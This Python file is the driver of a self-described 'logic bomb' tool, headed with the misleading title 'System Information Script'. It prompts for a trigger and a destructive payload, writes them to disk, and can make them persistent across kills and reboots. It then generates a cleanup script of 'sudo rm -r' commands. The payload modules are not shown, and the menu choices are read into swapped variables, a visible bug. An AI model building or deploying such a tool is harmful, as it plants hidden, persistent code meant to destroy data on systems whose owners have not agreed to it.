# ====================================================================
#
#       Title: System Information Script
#      Author: Chetanya Kunndra
#        Date: 12 Jan 2021
#       Email: mtcs20ck@policeuniversity.ac.in | ckunndra@gmail.com
#
# ====================================================================
# ====================================================================
#
#                    Disclaimer
#      This script is only for educational purposes.
#      Author bears no responsibility if you use it on your
#      own system and/or someone else's system.
#      This script will destroy you system.
#
# ====================================================================

from platform import system as psystem
from os import path as opath, system as osystem
from sys import executable
from time import sleep
from modules.payloads import BasePayload
from modules.triggers import BaseTrigger
from modules.file_creator import FileCreator
from modules.make_persistent import MakePersistent


class Driver:

    def __init__(self):
        self.all_triggers = self.get_all_triggers()
        self.all_payloads = self.get_all_payloads()
        # Constants
        self.CURRENT_OS = psystem()
        self.ROOT_DIRECTORY = '/' if opath.abspath(executable)[0] is None else opath.abspath(executable)[0]
        self.file_creator_obj = FileCreator(
            current_os=self.CURRENT_OS,
            root_directory=self.ROOT_DIRECTORY
        )

    def disclaimer(self):
        # Lol shenanigans
        print("Use it at your own risk. :)")
        sleep(2)
        print("Loading triggers, please wait...")
        sleep(1.5)
        print("Loading payloads, please wait...")
        sleep(1.5)
        print("Starting the interface, please wait...")
        sleep(1.5)
        print("Enjoy.")
        sleep(2)
        if self.CURRENT_OS == "Linux" or self.CURRENT_OS == "Darwin":
            osystem("clear")
        elif self.CURRENT_OS == "Windows":
            osystem("cls")

    @staticmethod
    def get_all_triggers():
        return BaseTrigger.__subclasses__()

    @staticmethod
    def get_all_payloads():
        return BasePayload.__subclasses__()

    def create_triggers(self, trigger_number: int, payload_files):
        trigger_files = []
        for trigger in self.all_triggers:
            if trigger.__trigger_number__ == trigger_number:
                if trigger.__takes_input__:
                    print(f"Enter the value for {trigger.__input_name__} - ")
                    trigger_variable = input()
                else:
                    trigger_variable = None

                for payload_file in payload_files:
                    if trigger_variable:
                        trigger_code = trigger().get_trigger(payload=payload_file, triggering_entity=trigger_variable)
                    else:
                        trigger_code = trigger().get_trigger(payload_file, None)

                    trigger_files += self.file_creator_obj.create_trigger_files(trigger_code)
                break

        return trigger_files

    def get_payload_code(self, payload_number: int):
        payload_code = None
        for payload in self.all_payloads:
            if payload.__payload_number__ == payload_number:
                payload_code = payload().get_payload(current_os=self.CURRENT_OS)
        return payload_code

    @staticmethod
    def create_cleanup(payload_files, trigger_files, persistent_files):
        cleanup = ""
        for payload in payload_files:
            cleanup += f"sudo rm -r {payload};\n"

        for trigger in trigger_files:
            cleanup += f"sudo rm -r {trigger};\n"

        for persistent in persistent_files:
            cleanup += f"sudo rm -r {persistent};\n"

        with open("cleanup.sh", "w+") as cleanup_obj:
            cleanup_obj.write(cleanup)

        osystem("sudo chmod +x cleanup.sh")

    def start(self):

        print("Logic Bomb :)")
        print("Choose a trigger - ")
        for trigger in self.all_triggers:
            print(f"{trigger.__trigger_number__} - {trigger.__trigger_name__}")

        print("Choice - ")
        payload_choice = int(input())

        print("Choose a payload - ")
        for payload in self.all_payloads:
            print(f"{payload.__payload_number__} - {payload.__payload_name__}")

        print("Choice - ")
        trigger_choice = int(input())

        print("Now main part. Think carefully.")
        print("Make persistent (y/n) ? ")
        print("Persistence means that the program will restart upon being killed.")
        print("It will also start whenever the system starts.")
        print("Choice - ")
        make_persistent = input()

        payload_code = self.get_payload_code(payload_number=payload_choice)

        all_payload_files = self.file_creator_obj.create_payload_files(payload_code=payload_code)
        all_trigger_files = self.create_triggers(trigger_number=trigger_choice, payload_files=all_payload_files)

        #TODO: yahan se dekho
        all_persistent_files = []
        if make_persistent.lower().replace("\n", "").replace(" ", "") == "y":
            all_persistent_files = MakePersistent(
                triggers=all_trigger_files,
                current_os=self.CURRENT_OS,
                root_directory=self.ROOT_DIRECTORY
            ).make_persistent()

        self.create_cleanup(payload_files=all_payload_files, trigger_files=all_trigger_files,
                            persistent_files=all_persistent_files)

        print("Created and deployed the logic Bomb.")
        print("Cleanup file created in the execution folder.")
        print("Use cleanup file to remove all triggers, payload and service files.")
        print("Exiting....")
        sleep(5)
        exit(0)


if __name__ == "__main__":
    driver_obj = Driver()
    driver_obj.disclaimer()
    driver_obj.start()
